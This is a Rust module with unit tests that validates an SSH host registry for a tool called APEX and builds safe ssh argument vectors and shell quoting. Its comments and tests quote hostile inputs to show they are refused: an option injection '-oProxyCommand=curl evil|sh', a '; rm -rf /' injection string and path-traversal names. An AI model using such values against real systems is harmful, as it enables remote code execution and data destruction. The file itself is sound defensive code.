//! Trusted APEX devices (roadmap §20): schema, validation, and the pure argv
//! planner.
//!
//! §20 asks for clipboard and file transfer between trusted APEX devices, for
//! opening a project on another device, for continuing a terminal or agent
//! session elsewhere, and for running builds, agents and local-model inference
//! on a stronger machine while driving them from a laptop. It also says how:
//!
//! > Use SSH/container primitives underneath, but present them as one coherent
//! > system.
//!
//! Nothing in this module performs I/O. It owns the registry format, the
//! validation, and the construction of the argument vectors that
//! [`crate::host`]'s callers hand to `ssh`.
//!
//! ── The transport is the user's own SSH configuration ───────────────────────
//!
//! A host entry names an **ssh destination** — normally an alias already in
//! `~/.ssh/config` — rather than storing an address, a port and a key path of
//! its own. This is the single most consequential decision here, and it is not
//! about saving code:
//!
//! * A real `~/.ssh/config` entry is often not "a hostname". The developer's
//!   `katana` alias resolves over the LAN when the LAN is up, and otherwise
//!   through a VPS port, and otherwise through a jump host into a reverse
//!   tunnel — three transports behind one name, selected by a `Match exec`.
//!   An address field in `hosts.toml` cannot express that, so `apex host add
//!   katana --address 192.168.1.245` would work at home and fail everywhere
//!   else, which is precisely when remote compute is worth having.
//! * It adds **no key management**. APEX generates no key, holds no passphrase
//!   and adds no agent, so it cannot produce the keyring or polkit prompt that
//!   a new credential store would. Authentication is whatever already works
//!   when the user types `ssh katana`.
//! * `known_hosts` stays where ssh put it. Host identity is already pinned by
//!   the user's own first connection; a second, APEX-owned trust store would
//!   be a second thing to get out of step.
//!
//! Explicit `user@host:port` is still accepted, because a machine that is not
//! in `~/.ssh/config` should not require editing that file first. It is stored
//! as the destination string ssh would take.
//!
//! ── What this module refuses, and why an argv is the reason ─────────────────
//!
//! Every value here reaches `ssh` as an argument. `ssh` reads a leading `-` as
//! an option, so a host whose destination is `-oProxyCommand=curl evil|sh`
//! would be an option injection, not a hostname — and the registry is a file,
//! so it need not have been typed by the person running the command. Names are
//! also path components under `~/.local/state/apex/hosts/`, so `..` and `/`
//! have to go too.
//!
//! The rule applied throughout: **validate to an allowlist, never escape.**
//! There is no quoting function in this file. A value either matches a narrow
//! character class or it is refused by name.
//!
//! ── The two kinds of state, kept apart ─────────────────────────────────────
//!
//! `apexd-core`'s existing rule (see [`crate::gameprofile`]) is that state
//! written only in response to an explicit user command is user-owned and
//! hand-editable, while anything a probe or a reconcile writes is generated and
//! belongs elsewhere. A host registry is the first case; a capability probe is
//! emphatically the second — it is a *measurement*, it goes stale, and nothing
//! the user typed produced its contents.
//!
//! So they are two files:
//!
//! | file | kind | writer |
//! | --- | --- | --- |
//! | `~/.config/apex/hosts.toml` | desired, user-owned, `deny_unknown_fields` | only `apex host add`/`remove`, only with what it was told |
//! | `~/.local/state/apex/hosts/<name>.json` | generated measurement, keeps unknown keys | `apex host probe`, on its own |
//!
//! The probe cache keeps unknown keys for the reason `apex_agent_core`'s config
//! does: two versions of `apex` may write it — a newer laptop probing an older
//! desktop, or the reverse — and a field one side does not recognise is not a
//! typo.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

/// Registry format version. Absent means this.
pub const SCHEMA_VERSION: u32 = 1;

/// The longest a host name may be. It is a path component and an ssh argument;
/// the bound is generous for a nickname and far below either limit.
const MAX_NAME: usize = 64;

/// The longest an ssh destination may be. A hostname is capped at 253 octets by
/// DNS; the slack covers `user@` and `:port`.
const MAX_DEST: usize = 320;

/// The longest a note may be. Printed only, but it arrives from a file.
const MAX_NOTE: usize = 200;

// ── the registry ─────────────────────────────────────────────────────────────

/// `~/.config/apex/hosts.toml` — every trusted device this machine knows.
///
/// A `BTreeMap` keyed by name, for the reason [`crate::gameprofile`] uses one:
/// the name is the identity, so a duplicate is impossible by construction
/// rather than by a validation pass, and a sorted map serialises
/// deterministically — which is what makes the round-trip lossless rather than
/// merely reversible.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Hosts {
    /// File-format version. Absent means [`SCHEMA_VERSION`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub version: Option<u32>,
    /// Trusted devices by name.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub host: BTreeMap<String, Host>,
}

/// One trusted device.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Host {
    /// The ssh destination: an alias from `~/.ssh/config` (`katana`) or an
    /// explicit `user@host`. Absent means the host's own name is the alias,
    /// which is the common case and keeps the file short.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ssh: Option<String>,
    /// A port, when the destination is not an alias that already carries one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub port: Option<u16>,
    /// A free-text reminder of what this machine is for.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,

    // ── recognised only to be refused ────────────────────────────────────────
    //
    // `deny_unknown_fields` already rejects an unknown key, with a message that
    // lists the legal ones and explains nothing. These three are declared so the
    // refusal can say where the setting really lives — and, for the first two,
    // so that a config written by someone expecting APEX to own SSH is told
    // clearly that it does not. None can survive `validate`, so none is ever
    // serialised.
    /// **Refused.** Identity is the user's own ssh configuration; see
    /// [`Hosts::validate`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub identity_file: Option<String>,
    /// **Refused.** Host-key policy is never weakened by APEX; see
    /// [`Hosts::validate`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub strict_host_key_checking: Option<String>,
    /// **Refused.** Free-form ssh options would defeat the allowlist this
    /// module is built on; see [`Hosts::validate`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ssh_options: Option<Vec<String>>,
}

impl Host {
    /// The ssh destination for this entry, defaulted to its own name.
    pub fn destination<'a>(&'a self, name: &'a str) -> &'a str {
        self.ssh.as_deref().unwrap_or(name)
    }
}

/// Why a registry was refused. One variant per refusal so callers can render a
/// message that names the offending entry rather than "invalid config".
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HostError {
    /// A version this build does not understand.
    UnsupportedVersion(u32),
    /// The name is empty, too long, or has a character that cannot appear in
    /// both a path component and an ssh argument.
    BadName(String),
    /// The destination is empty, too long, or not a plausible ssh destination.
    BadDestination { name: String, dest: String },
    /// A destination or name that `ssh` would read as an option.
    OptionLike { name: String, value: String },
    /// Port 0 is not a port.
    BadPort { name: String },
    /// A note longer than [`MAX_NOTE`].
    NoteTooLong { name: String },
    /// A key that exists only so its refusal can say where the setting lives.
    Refused { name: String, key: &'static str, because: &'static str },
}

impl std::fmt::Display for HostError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnsupportedVersion(v) => write!(
                f,
                "hosts.toml is version {v}, but this apex understands up to {SCHEMA_VERSION}"
            ),
            Self::BadName(n) => write!(
                f,
                "host name {n:?} is not usable: 1-{MAX_NAME} characters, letters, digits, \
                 '-', '_' or '.', and it may not be '.' or '..'"
            ),
            Self::BadDestination { name, dest } => write!(
                f,
                "host {name:?} has ssh destination {dest:?}, which is not a destination \
                 ssh would accept: 1-{MAX_DEST} characters of [A-Za-z0-9._-], optionally \
                 'user@' first"
            ),
            Self::OptionLike { name, value } => write!(
                f,
                "host {name:?} has {value:?}, which starts with '-'. ssh would read that as \
                 an option, not a destination, so it is refused rather than quoted"
            ),
            Self::BadPort { name } => {
                write!(f, "host {name:?} has port 0, which is not a port")
            }
            Self::NoteTooLong { name } => {
                write!(f, "host {name:?} has a note longer than {MAX_NOTE} characters")
            }
            Self::Refused { name, key, because } => {
                write!(f, "host {name:?} sets {key}, which APEX does not accept: {because}")
            }
        }
    }
}

impl std::error::Error for HostError {}

impl Hosts {
    /// Parse and validate a registry. Refuses rather than repairs: a file this
    /// does not fully understand is a file the user should be told about, not
    /// one to guess at.
    pub fn parse(text: &str) -> Result<Self, anyhow::Error> {
        let hosts: Self = toml::from_str(text)?;
        hosts.validate()?;
        Ok(hosts)
    }

    /// Serialise. Deterministic, because the map is sorted and every empty
    /// field is skipped.
    pub fn to_toml(&self) -> Result<String, anyhow::Error> {
        Ok(toml::to_string_pretty(self)?)
    }

    /// Every reason this registry is unusable, or `Ok`.
    ///
    /// Returns the *first* error rather than a list, matching the rest of the
    /// crate: the caller prints one refusal and exits non-zero, and a user
    /// fixing a hand-edited file wants the first thing that is wrong.
    pub fn validate(&self) -> Result<(), HostError> {
        if let Some(v) = self.version {
            if v > SCHEMA_VERSION {
                return Err(HostError::UnsupportedVersion(v));
            }
        }

        for (name, host) in &self.host {
            validate_name(name)?;

            // The refusals, before anything else that might mask them: a config
            // written by someone who expects APEX to own SSH identity should be
            // told that, not told about a character class.
            if host.identity_file.is_some() {
                return Err(HostError::Refused {
                    name: name.clone(),
                    key: "identity_file",
                    because: "authentication is your own ssh configuration. Put an \
                              IdentityFile in ~/.ssh/config for this host and APEX will \
                              use it, along with whatever else that entry says",
                });
            }
            if host.strict_host_key_checking.is_some() {
                return Err(HostError::Refused {
                    name: name.clone(),
                    key: "strict_host_key_checking",
                    because: "APEX never weakens host-key verification. Accept the host's \
                              key once with a plain `ssh` and it is pinned in your \
                              known_hosts for good",
                });
            }
            if host.ssh_options.is_some() {
                return Err(HostError::Refused {
                    name: name.clone(),
                    key: "ssh_options",
                    because: "arbitrary ssh options would defeat the argument validation \
                              this registry is built on. ~/.ssh/config is the place for \
                              per-host options, and APEX honours it",
                });
            }

            let dest = host.destination(name);
            validate_destination(name, dest)?;

            if host.port == Some(0) {
                return Err(HostError::BadPort { name: name.clone() });
            }
            if host.note.as_ref().is_some_and(|n| n.len() > MAX_NOTE) {
                return Err(HostError::NoteTooLong { name: name.clone() });
            }
        }
        Ok(())
    }

    /// Look a host up by name, validating the name first so a lookup cannot be
    /// the thing that lets a bad name through.
    pub fn get(&self, name: &str) -> Result<&Host, anyhow::Error> {
        validate_name(name)?;
        self.host.get(name).ok_or_else(|| {
            let known: Vec<&str> = self.host.keys().map(String::as_str).collect();
            if known.is_empty() {
                anyhow::anyhow!(
                    "no host named {name:?}, and no hosts are registered. \
                     Add one with `apex host add {name} --ssh <destination>`"
                )
            } else {
                anyhow::anyhow!(
                    "no host named {name:?}. Registered: {}",
                    known.join(", ")
                )
            }
        })
    }
}

/// A host name must work as both a path component and an ssh argument.
pub fn validate_name(name: &str) -> Result<(), HostError> {
    if name.starts_with('-') {
        return Err(HostError::OptionLike {
            name: name.to_string(),
            value: name.to_string(),
        });
    }
    if name.is_empty()
        || name.len() > MAX_NAME
        || name == "."
        || name == ".."
        || !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        return Err(HostError::BadName(name.to_string()));
    }
    Ok(())
}

/// An ssh destination: `host`, `user@host`. A port belongs in the `port` field
/// or in `~/.ssh/config`, not in the destination string, so `:` is not allowed
/// — it is the one character whose meaning differs between `ssh` and `scp`, and
/// picking a side would make the same registry mean two things.
pub fn validate_destination(name: &str, dest: &str) -> Result<(), HostError> {
    if dest.starts_with('-') {
        return Err(HostError::OptionLike {
            name: name.to_string(),
            value: dest.to_string(),
        });
    }
    if dest.is_empty() || dest.len() > MAX_DEST {
        return Err(HostError::BadDestination {
            name: name.to_string(),
            dest: dest.to_string(),
        });
    }

    // At most one '@', and neither side may be empty.
    let (user, hostpart) = match dest.split_once('@') {
        Some((u, h)) => (Some(u), h),
        None => (None, dest),
    };
    if let Some(u) = user {
        if u.is_empty()
            || u.contains('@')
            || !u
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        {
            return Err(HostError::BadDestination {
                name: name.to_string(),
                dest: dest.to_string(),
            });
        }
    }
    if hostpart.is_empty()
        || !hostpart
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        return Err(HostError::BadDestination {
            name: name.to_string(),
            dest: dest.to_string(),
        });
    }
    Ok(())
}

// ── the argv planner ─────────────────────────────────────────────────────────

/// How a remote command should be run, as far as this module is concerned.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tty {
    /// Allocate a remote pty and forward the local one (`ssh -t`). What a
    /// terminal or an interactive agent needs.
    Interactive,
    /// No pty (`ssh -T`). What a probe or a build needs, and what keeps a
    /// remote program from deciding it is talking to a human.
    None,
}

/// The ssh argument vector for running `command` on `host`.
///
/// The remote command is passed as a **single argument** and is never assembled
/// into a shell string here. ssh concatenates its remote-command arguments with
/// spaces and hands the result to the remote login shell, so a caller that
/// wants argument boundaries preserved must quote for that shell itself — see
/// [`remote_sh`], which is the only place in APEX that does it, and does it by
/// single-quoting rather than by hoping.
///
/// The options are fixed and short, and every one of them is a *refusal to
/// weaken* something rather than a convenience:
///
/// * `-o BatchMode=yes` — never prompt. A handoff that silently blocks on a
///   password prompt inside a non-interactive dispatch looks like a hang, and
///   this is also what keeps APEX from ever producing the credential prompt the
///   developer has twice asked never to see.
/// * `-o ConnectTimeout=<n>` — a laptop that has left the LAN must fail fast,
///   not sit in a TCP retry for two minutes.
/// * `-o StrictHostKeyChecking=accept-new` is **deliberately absent.** ssh's
///   own default (`ask`) applies, so an unknown host key stops the command
///   instead of being pinned by a background dispatch nobody was watching.
pub fn ssh_argv(dest: &str, port: Option<u16>, tty: Tty, connect_timeout: u32, command: Option<&str>) -> Vec<String> {
    let mut argv = vec!["ssh".to_string()];
    match tty {
        Tty::Interactive => argv.push("-t".into()),
        Tty::None => argv.push("-T".into()),
    }
    argv.push("-o".into());
    argv.push("BatchMode=yes".into());
    argv.push("-o".into());
    argv.push(format!("ConnectTimeout={connect_timeout}"));
    if let Some(p) = port {
        argv.push("-p".into());
        argv.push(p.to_string());
    }
    // `--` before the destination: ssh stops parsing options there, so even if a
    // destination somehow reached this function starting with '-', it could not
    // become one. The validation above already refuses that; this is the second
    // line, because argv construction is where an injection would land.
    argv.push("--".into());
    argv.push(dest.to_string());
    if let Some(c) = command {
        argv.push(c.to_string());
    }
    argv
}

/// Quote one argument for a POSIX shell, for the remote side of an ssh command.
///
/// Single quotes, with an embedded `'` written as `'\''`. This is the whole
/// trick and it is exact: inside single quotes a POSIX shell treats every
/// character literally, including backslashes, newlines and `$`, so there is
/// nothing else to escape.
///
/// It exists because `ssh host a b c` does not run `a` with arguments `b` and
/// `c` — it hands `a b c` to the remote shell as a string. A path with a space
/// in it silently becomes two arguments, which is the bug this prevents.
pub fn shell_quote(arg: &str) -> String {
    format!("'{}'", arg.replace('\'', r"'\''"))
}

/// A remote command line, from an argv, quoted for the remote login shell.
///
/// `remote_sh(&["ls", "/a b"])` produces `'ls' '/a b'`.
pub fn remote_sh<S: AsRef<str>>(argv: &[S]) -> String {
    argv.iter()
        .map(|a| shell_quote(a.as_ref()))
        .collect::<Vec<_>>()
        .join(" ")
}

// ── the capability probe ─────────────────────────────────────────────────────

/// What a probe found on a remote host.
///
/// Keeps unknown keys, unlike the registry: two versions of `apex` write this —
/// the probing side parses what the probed side printed — so a field this build
/// does not recognise is a newer peer, not a typo. `apex_agent_core::config`
/// keeps unknown keys for exactly this reason.
#[derive(Debug, Clone, Default, PartialEq, Deserialize, Serialize)]
pub struct HostCaps {
    /// Unix seconds when this probe ran. Staleness is the caller's judgement,
    /// so it is reported rather than enforced here.
    #[serde(default)]
    pub probed_at: i64,
    /// `apex --version`'s version, when `apex` is installed at all.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub apex_version: Option<String>,
    /// `VARIANT_ID` from the remote `/etc/os-release` — `daily`, `gaming`, …
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub variant: Option<String>,
    /// `PRETTY_NAME`, for hosts that are not APEX at all.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub os: Option<String>,
    /// Online CPUs.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cpus: Option<u32>,
    /// Total RAM in MiB.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub memory_mib: Option<u64>,
    /// Free space in MiB on the remote model store's filesystem.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub free_mib: Option<u64>,
    /// GPU descriptions, as the remote reported them.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub gpus: Vec<String>,
    /// Accelerator runtimes present: `cuda`, `rocm`, `vulkan`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub accel: Vec<String>,
    /// Whether the remote has the per-user agent runtime.
    #[serde(default)]
    pub agentd: bool,
    /// Whether the remote has the local inference service.
    #[serde(default)]
    pub ai: bool,
    /// Whether the remote has a container engine, for `apex build --on`.
    #[serde(default)]
    pub podman: bool,

    /// Anything a newer `apex` reported that this one does not know.
    #[serde(flatten)]
    pub unknown: BTreeMap<String, serde_json::Value>,
}

impl HostCaps {
    /// Whether this host can serve `apex ai run --on`. A host with no
    /// accelerator can still run CPU inference, so the test is the service, not
    /// the GPU.
    pub fn can_infer(&self) -> bool {
        self.ai
    }

    /// Whether this host looks like an APEX machine at all.
    pub fn is_apex(&self) -> bool {
        self.apex_version.is_some()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn one(name: &str, host: Host) -> Hosts {
        let mut h = Hosts::default();
        h.host.insert(name.to_string(), host);
        h
    }

    // ── names and destinations ───────────────────────────────────────────────

    #[test]
    fn a_plain_name_is_its_own_ssh_destination() {
        let h = Host::default();
        assert_eq!(h.destination("katana"), "katana");
    }

    #[test]
    fn an_explicit_destination_wins_over_the_name() {
        let h = Host { ssh: Some("andre@10.0.0.5".into()), ..Default::default() };
        assert_eq!(h.destination("desktop"), "andre@10.0.0.5");
    }

    #[test]
    fn a_name_starting_with_a_dash_is_refused_as_option_like() {
        // Not merely "invalid": the error has to say *why*, because a user who
        // named a host `-desktop` will otherwise think the charset is the issue.
        let e = validate_name("-desktop").unwrap_err();
        assert!(matches!(e, HostError::OptionLike { .. }), "got {e:?}");
        assert!(e.to_string().contains("ssh would read that as an option"));
    }

    #[test]
    fn a_destination_starting_with_a_dash_is_refused() {
        // The realistic attack: an option that runs a command.
        let e = validate_destination("x", "-oProxyCommand=curl evil|sh").unwrap_err();
        assert!(matches!(e, HostError::OptionLike { .. }), "got {e:?}");
    }

    #[test]
    fn path_traversal_names_are_refused() {
        // The name is a path component under ~/.local/state/apex/hosts/.
        for bad in ["..", ".", "../../etc/passwd", "a/b"] {
            assert!(validate_name(bad).is_err(), "{bad:?} was accepted");
        }
    }

    #[test]
    fn whitespace_and_shell_metacharacters_are_refused_in_names() {
        for bad in ["a b", "a\nb", "a;b", "a$b", "a`b", "a|b", "a&b", "a'b", "a\"b"] {
            assert!(validate_name(bad).is_err(), "{bad:?} was accepted");
        }
    }

    #[test]
    fn an_empty_or_overlong_name_is_refused() {
        assert!(validate_name("").is_err());
        assert!(validate_name(&"a".repeat(MAX_NAME)).is_ok());
        assert!(validate_name(&"a".repeat(MAX_NAME + 1)).is_err());
    }

    #[test]
    fn a_user_at_host_destination_is_accepted_but_a_bare_at_is_not() {
        assert!(validate_destination("x", "andre@katana").is_ok());
        assert!(validate_destination("x", "@katana").is_err());
        assert!(validate_destination("x", "andre@").is_err());
        assert!(validate_destination("x", "a@b@c").is_err());
    }

    #[test]
    fn a_colon_in_a_destination_is_refused_because_ssh_and_scp_disagree() {
        // `scp host:path` means a path; `ssh host:port` means nothing. Rather
        // than pick, the port has its own field.
        assert!(validate_destination("x", "katana:22").is_err());
    }

    // ── the refused keys ─────────────────────────────────────────────────────

    #[test]
    fn identity_file_is_refused_and_says_where_identity_lives() {
        let h = one("k", Host { identity_file: Some("~/.ssh/id".into()), ..Default::default() });
        let e = h.validate().unwrap_err();
        assert!(e.to_string().contains("~/.ssh/config"), "got {e}");
    }

    #[test]
    fn weakening_host_key_checking_is_refused() {
        let h = one(
            "k",
            Host { strict_host_key_checking: Some("no".into()), ..Default::default() },
        );
        let e = h.validate().unwrap_err();
        assert!(e.to_string().contains("never weakens"), "got {e}");
    }

    #[test]
    fn free_form_ssh_options_are_refused() {
        let h = one("k", Host { ssh_options: Some(vec!["-oX=y".into()]), ..Default::default() });
        assert!(h.validate().is_err());
    }

    #[test]
    fn a_refusal_names_the_host_that_caused_it() {
        let h = one("katana", Host { identity_file: Some("x".into()), ..Default::default() });
        assert!(h.validate().unwrap_err().to_string().contains("katana"));
    }

    // ── the file ─────────────────────────────────────────────────────────────

    #[test]
    fn a_registry_round_trips_losslessly() {
        let h = one(
            "katana",
            Host {
                ssh: Some("andre@katana".into()),
                port: Some(2222),
                note: Some("build box".into()),
                ..Default::default()
            },
        );
        let text = h.to_toml().unwrap();
        assert_eq!(Hosts::parse(&text).unwrap(), h);
    }

    #[test]
    fn an_unknown_key_in_the_registry_is_a_typo_and_is_refused() {
        // deny_unknown_fields: this file has exactly one program writer, so an
        // unrecognised key is a mistake, not a version skew.
        assert!(Hosts::parse("[host.k]\nsssh = \"x\"\n").is_err());
    }

    #[test]
    fn a_future_version_is_refused_rather_than_guessed_at() {
        let e = Hosts::parse(&format!("version = {}\n", SCHEMA_VERSION + 1)).unwrap_err();
        assert!(e.to_string().contains("understands up to"), "got {e}");
    }

    #[test]
    fn an_absent_version_means_the_current_one() {
        assert!(Hosts::parse("[host.k]\n").is_ok());
    }

    #[test]
    fn port_zero_is_refused() {
        let h = one("k", Host { port: Some(0), ..Default::default() });
        assert!(matches!(h.validate(), Err(HostError::BadPort { .. })));
    }

    #[test]
    fn an_empty_registry_is_valid() {
        assert!(Hosts::default().validate().is_ok());
        assert!(Hosts::parse("").is_ok());
    }

    // ── lookup ───────────────────────────────────────────────────────────────

    #[test]
    fn a_missing_host_lists_the_ones_that_exist() {
        let h = one("katana", Host::default());
        let e = h.get("desktop").unwrap_err().to_string();
        assert!(e.contains("katana"), "got {e}");
    }

    #[test]
    fn a_missing_host_in_an_empty_registry_says_how_to_add_one() {
        let e = Hosts::default().get("desktop").unwrap_err().to_string();
        assert!(e.contains("apex host add"), "got {e}");
    }

    #[test]
    fn lookup_validates_the_name_so_it_cannot_be_the_hole() {
        assert!(Hosts::default().get("../../etc").is_err());
    }

    // ── the argv planner ─────────────────────────────────────────────────────

    #[test]
    fn ssh_argv_never_prompts_and_always_times_out() {
        let a = ssh_argv("katana", None, Tty::None, 8, None);
        assert!(a.windows(2).any(|w| w == ["-o", "BatchMode=yes"]));
        assert!(a.windows(2).any(|w| w == ["-o", "ConnectTimeout=8"]));
    }

    #[test]
    fn ssh_argv_does_not_weaken_host_key_checking() {
        // The absence is the assertion. `accept-new` in a background dispatch
        // would pin a key nobody looked at.
        let a = ssh_argv("katana", None, Tty::None, 8, Some("true"));
        assert!(
            !a.iter().any(|x| x.contains("StrictHostKeyChecking")),
            "argv sets StrictHostKeyChecking: {a:?}"
        );
    }

    #[test]
    fn ssh_argv_puts_a_double_dash_before_the_destination() {
        let a = ssh_argv("katana", None, Tty::None, 8, None);
        let dd = a.iter().position(|x| x == "--").expect("no --");
        assert_eq!(a[dd + 1], "katana");
    }

    #[test]
    fn a_port_becomes_dash_p() {
        let a = ssh_argv("katana", Some(2222), Tty::None, 8, None);
        assert!(a.windows(2).any(|w| w == ["-p", "2222"]));
    }

    #[test]
    fn interactive_asks_for_a_tty_and_batch_does_not() {
        assert!(ssh_argv("k", None, Tty::Interactive, 8, None).contains(&"-t".to_string()));
        assert!(ssh_argv("k", None, Tty::None, 8, None).contains(&"-T".to_string()));
    }

    #[test]
    fn the_remote_command_is_exactly_one_argument() {
        // If this ever became several, ssh would join them with spaces and the
        // quoting done by remote_sh would be undone.
        let a = ssh_argv("k", None, Tty::None, 8, Some("'ls' '/a b'"));
        assert_eq!(a.last().unwrap(), "'ls' '/a b'");
        assert_eq!(a.iter().filter(|x| x.contains("ls")).count(), 1);
    }

    // ── quoting ──────────────────────────────────────────────────────────────

    #[test]
    fn shell_quote_survives_a_single_quote() {
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }

    #[test]
    fn shell_quote_leaves_everything_else_literal() {
        // Inside single quotes a POSIX shell interprets nothing, so none of
        // these needs a backslash — and adding one would change the value.
        for s in ["$HOME", "`id`", "a\\b", "a\nb", "a;b", "*", "a|b", "a&&b"] {
            assert_eq!(shell_quote(s), format!("'{s}'"), "{s:?}");
        }
    }

    #[test]
    fn remote_sh_preserves_argument_boundaries() {
        assert_eq!(remote_sh(&["ls", "/a b"]), "'ls' '/a b'");
    }

    #[test]
    fn remote_sh_of_an_injection_attempt_is_inert() {
        // The whole point: this must be one argument to `echo`, not a command.
        let q = remote_sh(&["echo", "; rm -rf /"]);
        assert_eq!(q, r"'echo' '; rm -rf /'");
    }

    #[test]
    fn remote_sh_of_an_empty_argument_keeps_it() {
        assert_eq!(remote_sh(&["a", "", "b"]), "'a' '' 'b'");
    }

    // ── capabilities ─────────────────────────────────────────────────────────

    #[test]
    fn caps_keep_fields_a_newer_apex_reported() {
        // Version skew, not a typo: the probing and probed sides are different
        // installs.
        let c: HostCaps =
            serde_json::from_str(r#"{"apex_version":"0.2.0","npu":true}"#).unwrap();
        assert_eq!(c.apex_version.as_deref(), Some("0.2.0"));
        assert!(c.unknown.contains_key("npu"));
    }

    #[test]
    fn caps_round_trip_through_json_with_unknown_fields_intact() {
        let c: HostCaps = serde_json::from_str(r#"{"cpus":20,"future":"x"}"#).unwrap();
        let back: HostCaps = serde_json::from_str(&serde_json::to_string(&c).unwrap()).unwrap();
        assert_eq!(back.cpus, Some(20));
        assert_eq!(back.unknown.get("future").unwrap(), "x");
    }

    #[test]
    fn inference_capability_is_the_service_not_the_gpu() {
        // A CPU-only host can still serve inference, slowly.
        let cpu_only = HostCaps { ai: true, ..Default::default() };
        assert!(cpu_only.can_infer());
        let gpu_no_service =
            HostCaps { gpus: vec!["RTX 3070".into()], ai: false, ..Default::default() };
        assert!(!gpu_no_service.can_infer());
    }

    #[test]
    fn a_non_apex_host_is_recognisable_as_one() {
        assert!(!HostCaps { os: Some("Ubuntu".into()), ..Default::default() }.is_apex());
        assert!(HostCaps { apex_version: Some("0.1.0".into()), ..Default::default() }.is_apex());
    }
}
